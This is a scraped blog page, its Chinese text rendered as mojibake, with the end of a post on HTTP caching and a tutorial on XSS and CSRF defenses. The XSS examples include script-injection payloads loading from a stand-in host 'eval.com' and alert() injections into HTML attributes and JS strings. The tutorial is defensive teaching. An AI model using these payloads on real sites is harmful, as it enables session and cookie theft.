<li>private<br>è¡¨æ˜å“åº”åªèƒ½è¢«å•ä¸ªç”¨æˆ·ç¼“å­˜ï¼Œä¸èƒ½ä½œä¸ºå…±äº«ç¼“å­˜ï¼ˆå³ä»£ç†æœåŠ¡å™¨ä¸èƒ½ç¼“å­˜å®ƒï¼‰,å¯ä»¥ç¼“å­˜å“åº”å†…å®¹ã€‚</li>
<li>no-cache<br>åœ¨å‘å¸ƒç¼“å­˜å‰¯æœ¬ä¹‹å‰ï¼Œå¼ºåˆ¶é«˜é€Ÿç¼“å­˜å°†è¯·æ±‚æäº¤ç»™åŸå§‹æœåŠ¡å™¨è¿›è¡ŒéªŒè¯ã€‚</li>
<li>no-store<br>ç¼“å­˜ä¸åº”å­˜å‚¨æœ‰å…³å®¢æˆ·ç«¯è¯·æ±‚æˆ–æœåŠ¡å™¨å“åº”çš„ä»»ä½•å†…å®¹ã€‚<h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4></li>
<li>ç¼“å­˜è¿‡æœŸæ—¶é—´ï¼Œç”¨æ¥æŒ‡å®šèµ„æºåˆ°æœŸæ—¶é—´ï¼Œæ˜¯æœåŠ¡å™¨ç«¯çš„å…·ä½“çš„æ—¶é—´ç‚¹</li>
<li>å‘Šè¯‰æµè§ˆå™¨åœ¨è¿‡æœŸæ—¶é—´å‰æµè§ˆå™¨å¯ä»¥ç›´æ¥ä»æµè§ˆå™¨ç¼“å­˜å»æ•°æ®ï¼Œæ— éœ€å†æ¬¡è¯·æ±‚<h4 id="Last-Modified-If-Modified-Since"><a href="#Last-Modified-If-Modified-Since" class="headerlink" title="Last-Modified/If-Modified-Since"></a>Last-Modified/If-Modified-Since</h4><h5 id="ç‰¹ç‚¹"><a href="#ç‰¹ç‚¹" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h5>The Last-Modified  æ˜¯ä¸€ä¸ªå“åº”é¦–éƒ¨ï¼Œå…¶ä¸­åŒ…å«æºå¤´æœåŠ¡å™¨è®¤å®šçš„èµ„æºåšå‡ºä¿®æ”¹çš„æ—¥æœŸåŠæ—¶é—´ã€‚ å®ƒé€šå¸¸è¢«ç”¨ä½œä¸€ä¸ªéªŒè¯å™¨æ¥åˆ¤æ–­æ¥æ”¶åˆ°çš„æˆ–è€…å­˜å‚¨çš„èµ„æºæ˜¯å¦å½¼æ­¤ä¸€è‡´<br>1ã€è¯·æ±‚æµè§ˆå™¨ï¼Œç»™åˆ°ç¼“å­˜æ–‡ä»¶ï¼Œresponseå¸¦æœ‰last-modified ç»™åˆ°æµè§ˆå™¨å­˜å‚¨ä¸ºlast-modified-since<br>2ã€æµè§ˆå™¨å†æ¬¡è¯·æ±‚æ–‡ä»¶ï¼Œå¸¦æœ‰last-modiied-since, æœåŠ¡å™¨å¯¹æ¯”last-modifiedï¼Œè‹¥è¿‡æœŸåˆ™ç»™åˆ°æ–°çš„æ–‡ä»¶ï¼Œè‹¥ä¸è¿‡æœŸï¼Œåˆ™ç»§ç»­ä½¿ç”¨æœ¬åœ°æ–‡ä»¶<h5 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h5>1ã€æŸäº›æœåŠ¡å™¨ä¸èƒ½è·å–ç²¾ç¡®çš„ä¿®æ”¹æ—¶é—´<br>2ã€æ–‡ä»¶ä¿®æ”¹æ—¶é—´æ”¹äº†ï¼Œä½†æ–‡ä»¶å†…å®¹å´æ²¡æœ‰æ”¹å˜<h4 id="Etag-If-None-Match"><a href="#Etag-If-None-Match" class="headerlink" title="Etag/If-None-Match"></a>Etag/If-None-Match</h4></li>
<li>æ–‡ä»¶å†…å®¹çš„hashå€¼</li>
<li>etagâ€”â€”response header</li>
<li>if-none-match â€”â€” request header</li>
<li>éœ€è¦å’Œcache-controlä¸€èµ·ä½¿ç”¨<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> ---------------------    </span><br><span class="line">					   å½“æµè§ˆå™¨æœ¬åœ°æ²¡æœ‰ç¼“å­˜æˆ–è€…ä¸‹ä¸€å±‚å¤±æ•ˆæ—¶ï¼Œæˆ–è€…ç”¨æˆ·ç‚¹å‡»åˆ·æ–°</span><br><span class="line">\       200çŠ¶æ€        /   æµè§ˆå™¨ç›´æ¥å»æœåŠ¡å™¨ä¸‹è½½æœ€æ–°æ•°æ®</span><br><span class="line"></span><br><span class="line">  -------------------     </span><br><span class="line">					   è¿™ä¸€å±‚ç”± last-modified / Etag æ§åˆ¶,å½“ä¸‹ä¸€å±‚å¤±æ•ˆæ—¶ï¼Œ</span><br><span class="line">  \     304çŠ¶æ€       /    æˆ–ç”¨æˆ·ç‚¹å‡»åˆ·æ–°ï¼Œæµè§ˆå™¨å°±ä¼šå‘é€è¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œå¦‚æœæ–‡ä»¶æ— å˜</span><br><span class="line">					   åŒ–åˆ™è¿”å›304</span><br><span class="line">    ----------------      </span><br><span class="line">				       è¿™å±‚ç”±expires/cache-controlæ§åˆ¶ï¼Œexpires(http 1.0     </span><br><span class="line">    \ 200(from disk) /    æœ‰æ•ˆ)æ˜¯ç»å¯¹æ—¶é—´ï¼Œcache-control(http1.1ç‰ˆæœ‰æ•ˆ)ç›¸å¯¹</span><br><span class="line">					   æ—¶é—´ï¼Œä¸¤è€…éƒ½å­˜åœ¨ï¼Œcache-controlè¦†ç›–expiresï¼Œæ²¡æœ‰å¤±æ•ˆ</span><br><span class="line">      --------------      åˆ™ç›´æ¥è®¿é—®è‡ªå·±ç¼“å­˜</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/å‰ç«¯/font-end-optimize/./font-end-cache.png" alt="Alt text"></p>
<h2 id="æœåŠ¡ç«¯æ€§èƒ½ä¼˜åŒ–"><a href="#æœåŠ¡ç«¯æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="æœåŠ¡ç«¯æ€§èƒ½ä¼˜åŒ–"></a>æœåŠ¡ç«¯æ€§èƒ½ä¼˜åŒ–</h2><h3 id="å¤šå±‚æ¬¡ä¼˜åŒ–æ–¹æ¡ˆ"><a href="#å¤šå±‚æ¬¡ä¼˜åŒ–æ–¹æ¡ˆ" class="headerlink" title="å¤šå±‚æ¬¡ä¼˜åŒ–æ–¹æ¡ˆ"></a>å¤šå±‚æ¬¡ä¼˜åŒ–æ–¹æ¡ˆ</h3><ul>
<li>æ„å»ºå±‚æ¨¡ç‰ˆç¼–è¯‘</li>
<li>æ•°æ®æ— å…³prerenderæ–¹å¼</li>
<li>æœåŠ¡ç«¯æ¸²æŸ“</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/HTTP/what-is-xss-csrf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/HTTP/what-is-xss-csrf/" itemprop="url">å•¥æ˜¯XSSå’ŒCSRF?</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-18T18:18:49+08:00">
                2019-04-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>æœ¬æ–‡é€šè¿‡ä»‹ç»ã€åŸç†ã€é˜²å¾¡æ¥è®²è§£XSSä»¥åŠCSRFã€‚ä¸»è¦ä»‹ç»åŠè®²è§£æ”»å‡»åŸç†ï¼ŒåŠé˜²å¾¡åŸç†ã€‚</p>
<h1 id="å•¥æ˜¯XSSï¼Ÿ"><a href="#å•¥æ˜¯XSSï¼Ÿ" class="headerlink" title="å•¥æ˜¯XSSï¼Ÿ"></a>å•¥æ˜¯XSSï¼Ÿ</h1><h2 id="XSS-Cross-site-scripting-ä»‹ç»"><a href="#XSS-Cross-site-scripting-ä»‹ç»" class="headerlink" title="XSS(Cross-site scripting)ä»‹ç»"></a>XSS(Cross-site scripting)ä»‹ç»</h2><p>ä»¥ä¸‹æ˜¯<strong>Wikipedia</strong>åŠ<strong>MDN</strong>å¯¹XSSçš„ä»‹ç»</p>
<blockquote>
<p>Wikipedia:</p>
<p><strong>è·¨ç½‘ç«™æŒ‡ä»¤ç </strong>ï¼ˆè‹±è¯­ï¼šCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºï¼šXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹å¼çš„å®‰å…¨æ¼æ´æ”»å‡»ï¼Œæ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ã€‚å®ƒå…è®¸æ¶æ„ä½¿ç”¨è€…å°†ç¨‹å¼ç æ³¨å…¥åˆ°ç½‘é¡µä¸Šï¼Œå…¶ä»–ä½¿ç”¨è€…åœ¨è§‚çœ‹ç½‘é¡µæ—¶å°±ä¼šå—åˆ°å½±å“ã€‚è¿™ç±»æ”»å‡»é€šå¸¸åŒ…å«äº†HTMLä»¥åŠä½¿ç”¨è€…ç«¯è„šæœ¬è¯­è¨€ã€‚</p>
<p><strong>XSS</strong>æ”»å‡»é€šå¸¸æŒ‡çš„æ˜¯é€šè¿‡åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œé€šè¿‡å·§å¦™çš„æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯JavaScriptï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬Javaï¼ŒVBScriptï¼ŒActiveXï¼ŒFlashæˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„HTMLã€‚æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°æ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ã€‚</p>
<p>MDN:</p>
<p>è·¨ç«™è„šæœ¬æ”»å‡»Cross-site scripting (XSS)æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§æ¼æ´åœ¨ç½‘ç«™ä¸Šæ³¨å…¥æ¶æ„çš„å®¢æˆ·ç«¯ä»£ç ã€‚å½“è¢«æ”»å‡»è€…ç™»é™†ç½‘ç«™æ—¶å°±ä¼šè‡ªåŠ¨è¿è¡Œè¿™äº›æ¶æ„ä»£ç ï¼Œä»è€Œï¼Œæ”»å‡»è€…å¯ä»¥çªç ´ç½‘ç«™çš„è®¿é—®æƒé™ï¼Œå†’å……å—å®³è€…</p>
</blockquote>
<p><strong>åˆ’é‡ç‚¹ï¼š ç½‘ç«™æ¼æ´ã€HTMLã€è„šæœ¬ã€æ¶æ„æ³¨å…¥ã€è·å–æƒé™</strong></p>
<p><strong>æ€»ç»“ï¼šè·¨ç«™è„šæœ¬æ”»å‡»ç”¨æˆ·åŠ è½½æ¶æ„è„šæœ¬ï¼Œç”¨æˆ·ä¿¡æ¯åŠæƒé™ç­‰è¢«æ¶æ„è·å–</strong></p>
<h2 id="XSSåŸç†"><a href="#XSSåŸç†" class="headerlink" title="XSSåŸç†"></a>XSSåŸç†</h2><p>è¢«æ”»å‡»çš„é€šå¸¸åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼š<strong>å­˜å‚¨å‹XSSã€åå°„å‹XSS</strong></p>
<h3 id="å­˜å‚¨å‹XSSåŸç†"><a href="#å­˜å‚¨å‹XSSåŸç†" class="headerlink" title="å­˜å‚¨å‹XSSåŸç†"></a>å­˜å‚¨å‹XSSåŸç†</h3><blockquote>
<p>æ³¨å…¥å‹è„šæœ¬æ°¸ä¹…å­˜å‚¨åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šã€‚å½“æµè§ˆå™¨è¯·æ±‚æ•°æ®æ—¶ï¼Œè„šæœ¬ä»æœåŠ¡å™¨ä¸Šä¼ å›å¹¶æ‰§è¡Œã€‚</p>
</blockquote>
<p>ä¸‹é¢çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// html è¯„è®º</span><br><span class="line">&lt;input name=&quot;comment&quot; id=&quot;comment&quot; value=&quot;&lt;script src=&apos;http://eval.com&apos;&gt;&lt;/script&gt;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">// db</span><br><span class="line">insert into table value(&quot;&lt;script src=&apos;http://eval.com&apos;&gt;&lt;/script&gt;&quot;)</span><br><span class="line"></span><br><span class="line">// æ­¥éª¤</span><br><span class="line">1ã€æ¶æ„ç”¨æˆ·å°†è¯„è®ºå¸¦ä¸€ä¸ªscriptæ ‡ç­¾ï¼Œscriptå¸¦æœ‰æ¶æ„æ”»å‡»ï¼Œä¾‹å¦‚è·å–é¡µé¢cookies</span><br><span class="line">2ã€è¯„è®ºè¢«æ·»åŠ è¿›æ•°æ®åº“</span><br><span class="line">3ã€ç”¨æˆ·éƒ½å¯ä»¥çœ‹è§è¯„è®ºï¼Œå¹¶åŠ è½½ä¸€ä¸ªscript</span><br><span class="line">4ã€æ¶æ„scriptç›—å–ç”¨æˆ·ä¿¡æ¯</span><br></pre></td></tr></table></figure>
<p><strong>æ€»ç»“ï¼šå­˜å‚¨å‹XSSå°†æ¶æ„ä»£ç å­˜å‚¨è¿›æ•°æ®åº“ï¼Œç”¨æˆ·åŠ è½½æ¶æ„è„šæœ¬æ—¶ï¼Œæ¶æ„è„šæœ¬å°†ä¼šä»æœåŠ¡å™¨ä¸Šä¼ å›å¹¶æ‰§è¡Œ</strong></p>
<h3 id="åå°„å‹XSSåŸç†"><a href="#åå°„å‹XSSåŸç†" class="headerlink" title="åå°„å‹XSSåŸç†"></a>åå°„å‹XSSåŸç†</h3><blockquote>
<p> å½“ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼Œæˆ–è€…æäº¤ä¸€ä¸ªè¡¨å•ï¼Œæˆ–è€…è¿›å…¥ä¸€ä¸ªæ¶æ„ç½‘ç«™æ—¶ï¼Œæ³¨å…¥è„šæœ¬è¿›å…¥è¢«æ”»å‡»è€…çš„ç½‘ç«™ã€‚WebæœåŠ¡å™¨å°†æ³¨å…¥è„šæœ¬ï¼Œæ¯”å¦‚ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œæœç´¢ç»“æœç­‰ è¿”å›åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šã€‚æµè§ˆå™¨ä¼šæ‰§è¡Œè¿™æ®µè„šæœ¬ï¼Œå› ä¸ºï¼Œå®ƒè®¤ä¸ºè¿™ä¸ªå“åº”æ¥è‡ªå¯ä¿¡ä»»çš„æœåŠ¡å™¨ã€‚</p>
</blockquote>
<p>ä¸‹é¢çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// url</span><br><span class="line">http://example.com?search=value&apos;&lt;script src=&quot;http://eval.com&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line"></span><br><span class="line">// html</span><br><span class="line">&lt;input value=window.location.search&gt;</span><br><span class="line"></span><br><span class="line">// æ­¥éª¤</span><br><span class="line">1ã€ç½‘é¡µå†…åµŒå€¼ç”±å‚æ•°ç›´æ¥ä¼ å…¥</span><br><span class="line">2ã€æ¶æ„æ”»å‡»è€…å°†å‚æ•°åŒ…å«scriptæ ‡ç­¾ï¼ŒåŠ è½½æ¶æ„è„šæœ¬</span><br><span class="line">3ã€æ¶æ„è„šæœ¬åœ¨ç½‘é¡µä¸­ç”Ÿæ•ˆï¼Œç›—å–ç”¨æˆ·ä¿¡æ¯</span><br></pre></td></tr></table></figure>
<p><strong>æ€»ç»“ï¼šåå°„å‹XSSæ˜¯é€šè¿‡é“¾æ¥å‚æ•°æˆ–è¡¨å•ï¼Œé€šè¿‡ç‚¹å‡»é“¾æ¥ã€æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œç½‘é¡µåŠ è½½åï¼Œæ¶æ„è„šæœ¬å°†ä¼šæ‰§è¡Œ</strong></p>
<h2 id="XSSé˜²å¾¡"><a href="#XSSé˜²å¾¡" class="headerlink" title="XSSé˜²å¾¡"></a>XSSé˜²å¾¡</h2><h3 id="XSSæ³¨å…¥ç‚¹"><a href="#XSSæ³¨å…¥ç‚¹" class="headerlink" title="XSSæ³¨å…¥ç‚¹"></a>XSSæ³¨å…¥ç‚¹</h3><p>åœ¨é˜²å¾¡ä¹‹å‰åº”è¯¥äº†è§£XSSæœ‰å“ªäº›æ³¨å…¥ç‚¹ï¼Œå…¶ä¸­åŒ…æ‹¬HTMLèŠ‚ç‚¹ã€HTMLå±æ€§ã€JavaScriptä»£ç ä»¥åŠå¯Œæ–‡æœ¬</p>
<h4 id="HTMLèŠ‚ç‚¹"><a href="#HTMLèŠ‚ç‚¹" class="headerlink" title="HTMLèŠ‚ç‚¹"></a>HTMLèŠ‚ç‚¹</h4><p>htmlèŠ‚ç‚¹åŒ…å«ç”¨æˆ·è¾“å…¥å†…å®¹ï¼ŒèŠ‚ç‚¹å†…å®¹åŒ…å«è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML</span><br><span class="line">&lt;div&gt;$&#123;content&#125;&lt;/div&gt;</span><br><span class="line">// ç”¨æˆ·è¾“å…¥ï¼Œå°†contentå†…å®¹æ›¿æ¢ä¸º&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h4 id="HTMLå±æ€§"><a href="#HTMLå±æ€§" class="headerlink" title="HTMLå±æ€§"></a>HTMLå±æ€§</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML</span><br><span class="line">&lt;img src=&quot;$&#123;src&#125;&quot;&gt;</span><br><span class="line">// ç”¨æˆ·è¾“å…¥ï¼Œå°†srcæ›¿æ¢ä¸º 2&quot; onerror=&quot;alert(2)</span><br><span class="line">&lt;img src=&quot;2&quot; onerror=&quot;alert(2)&quot;&gt;</span><br></pre></td></tr></table></figure>
<h4 id="JavaScriptä»£ç "><a href="#JavaScriptä»£ç " class="headerlink" title="JavaScriptä»£ç "></a>JavaScriptä»£ç </h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// JS</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var data = &quot;$&#123;data&#125;&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">// ç”¨æˆ·è¾“å…¥ï¼Œå°†dataæ›¿æ¢ä¸º hello&quot;;alert(3); var a = &quot;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var data = &quot;hello&quot;; alert(3);var a = &quot;&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h4 id="å¯Œæ–‡æœ¬"><a href="#å¯Œæ–‡æœ¬" class="headerlink" title="å¯Œæ–‡æœ¬"></a>å¯Œæ–‡æœ¬</h4><p>ç”±äºå¯Œæ–‡æœ¬éœ€è¦ä¿ç•™htmlçš„åŸå› ï¼Œå› æ­¤æœ¬èº«ä¼šæœ‰xssé£é™©</p>
<h3 id="XSSåˆ†æåŠé˜²å¾¡"><a href="#XSSåˆ†æåŠé˜²å¾¡" class="headerlink" title="XSSåˆ†æåŠé˜²å¾¡"></a>XSSåˆ†æåŠé˜²å¾¡</h3><p>äº†è§£æ”»å‡»åŸç†åï¼Œé˜²å¾¡è‡ªç„¶è€Œç„¶çš„ä¹Ÿæ°´åˆ°æ¸ æˆäº†</p>
<h4 id="æµè§ˆå™¨è‡ªå¸¦é˜²å¾¡"><a href="#æµè§ˆå™¨è‡ªå¸¦é˜²å¾¡" class="headerlink" title="æµè§ˆå™¨è‡ªå¸¦é˜²å¾¡"></a>æµè§ˆå™¨è‡ªå¸¦é˜²å¾¡</h4><p>æµè§ˆå™¨è‡ªå¸¦ä¸€äº›é˜²å¾¡èƒ½åŠ›ï¼Œåªèƒ½é˜²å¾¡ XSS åå°„ç±»å‹æ”»å‡»ï¼Œä¸”åªèƒ½é˜²å¾¡HTMLå±æ€§</p>
<p>é˜²å¾¡åŸç†æ˜¯å°†å¯èƒ½ä¼šæ‰§è¡Œè„šæœ¬çš„æ ‡ç­¾æˆ–å±æ€§è¿›è¡Œè½¬ä¹‰å’Œè¿‡æ»¤ã€‚</p>
<h4 id="HTMLèŠ‚ç‚¹å†…å®¹åŠå±æ€§é˜²å¾¡"><a href="#HTMLèŠ‚ç‚¹å†…å®¹åŠå±æ€§é˜²å¾¡" class="headerlink" title="HTMLèŠ‚ç‚¹å†…å®¹åŠå±æ€§é˜²å¾¡"></a>HTMLèŠ‚ç‚¹å†…å®¹åŠå±æ€§é˜²å¾¡</h4><p>å°†&lt;å’Œ&gt;è½¬è¯‘æˆ&amp;lt &amp;gtï¼Œå°†å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œ&amp;åŠç©ºæ ¼ç­‰è½¬è¯‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML</span><br><span class="line">&lt;div&gt;$&#123;content&#125;&lt;/div&gt;</span><br><span class="line">// ç”¨æˆ·è¾“å…¥&lt;script&gt;alert(1)&lt;/script&gt;åè¿›è¡Œè½¬è¯‘ï¼Œå°†&lt;&gt;è¿›è¡Œè½¬è¯‘&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt</span><br><span class="line">&lt;div&gt;&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h4 id="Javascriptä»£ç é˜²å¾¡"><a href="#Javascriptä»£ç é˜²å¾¡" class="headerlink" title="Javascriptä»£ç é˜²å¾¡"></a>Javascriptä»£ç é˜²å¾¡</h4><p>ä½¿ç”¨JSON.stringify</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// JS</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var data = &quot;$&#123;data&#125;&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">// ç”¨æˆ·è¾“å…¥ï¼Œå°†dataæ›¿æ¢ä¸º hello&quot;;alert(3); var a = &quot;,ä½¿ç”¨JSON.stringify(hello&quot;;alert(3); var a = &quot;)</span><br><span class="line">// å¯¹è¾“å…¥å†…å®¹ä¼šå‡ºç°è½¬è¯‘é”™è¯¯ï¼Œç»“æŸæ“ä½œ</span><br></pre></td></tr></table></figure>
<h4 id="å¯Œæ–‡æœ¬é˜²å¾¡"><a href="#å¯Œæ–‡æœ¬é˜²å¾¡" class="headerlink" title="å¯Œæ–‡æœ¬é˜²å¾¡"></a>å¯Œæ–‡æœ¬é˜²å¾¡</h4><p>æŒ‰ç…§ç™½åå•ä¿ç•™éƒ¨åˆ†æ ‡ç­¾å’Œå±æ€§</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var whiteList = &#123;</span><br><span class="line">    &quot;img&quot;:[&quot;src&quot;],</span><br><span class="line">    &quot;a&quot;:[&quot;href&quot;],</span><br><span class="line">    &quot;font&quot;:[&quot;color&quot;,&quot;size&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">html.forEach(node =&gt; &#123;</span><br><span class="line">    // è¿‡æ»¤ç™½åå•</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>æœ€ä½³æ–¹å¼ä½¿ç”¨ç¬¬ä¸‰æ–¹<a href="https://github.com/leizongmin/js-xss" target="_blank" rel="noopener">js-xss</a>ç™½åå•è¿›è¡Œè¿‡æ»¤</p>
<h3 id="XSSæ”»å‡»é˜²å¾¡æ€»ç»“ï¼š"><a href="#XSSæ”»å‡»é˜²å¾¡æ€»ç»“ï¼š" class="headerlink" title="XSSæ”»å‡»é˜²å¾¡æ€»ç»“ï¼š"></a>XSSæ”»å‡»é˜²å¾¡æ€»ç»“ï¼š</h3><ul>
<li>XSSæ˜¯é€šè¿‡åŠ è½½ç¬¬ä¸‰æ–¹è„šæœ¬è¿›è¡Œæ”»å‡»</li>
<li>XSSæ”»å‡»ç±»å‹æœ‰å­˜å‚¨å‹å’Œåå°„å‹</li>
<li>XSSæ³¨å…¥ç‚¹åŒ…æ‹¬HTMLèŠ‚ç‚¹ã€HTMLå±æ€§ã€JavaScriptä»£ç ä»¥åŠå¯Œæ–‡æœ¬</li>
<li>XSSé˜²å¾¡é€šè¿‡æµè§ˆå™¨è‡ªå¸¦é˜²å¾¡ã€æ ‡ç­¾è½¬è¯‘ã€JSä»£ç JSON.stringifyåŠç™½åå•è¿‡æ»¤è¿›è¡Œé˜²å¾¡</li>
</ul>
<h1 id="å•¥åˆæ˜¯CSRFï¼Ÿ"><a href="#å•¥åˆæ˜¯CSRFï¼Ÿ" class="headerlink" title="å•¥åˆæ˜¯CSRFï¼Ÿ"></a>å•¥åˆæ˜¯CSRFï¼Ÿ</h1><h2 id="CSRF-Cross-Site-Request-forgery-ä»‹ç»"><a href="#CSRF-Cross-Site-Request-forgery-ä»‹ç»" class="headerlink" title="CSRF(Cross Site Request forgery)ä»‹ç»"></a>CSRF(Cross Site Request forgery)ä»‹ç»</h2><p>ä»¥ä¸‹æ˜¯<strong>Wikipedia</strong>åŠ<strong>MDN</strong>å¯¹CSRFçš„ä»‹ç»</p>
<blockquote>
<p>Wikipedia:</p>
<p><strong>è·¨ç«™è¯·æ±‚ä¼ªé€ </strong>ï¼ˆè‹±è¯­ï¼šCross-site request forgeryï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸º <strong>one-click attack</strong> æˆ–è€… <strong>session riding</strong>ï¼Œé€šå¸¸ç¼©å†™ä¸º <strong>CSRF</strong> æˆ–è€… <strong>XSRF</strong>ï¼Œ æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•</p>
<p>MDN:</p>
<p>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ˜¯ä¸€ç§å†’å……å—ä¿¡ä»»ç”¨æˆ·ï¼Œå‘æœåŠ¡å™¨å‘é€éé¢„æœŸè¯·æ±‚çš„æ”»å‡»æ–¹å¼</p>
</blockquote>
<p><strong>åˆ’é‡ç‚¹ï¼šè·¨ç«™è¯·æ±‚ä¼ªé€ ã€å†’å……å—ä¿¡ä»»ç”¨æˆ·ã€å‘é€éé¢„æœŸè¯·æ±‚</strong></p>
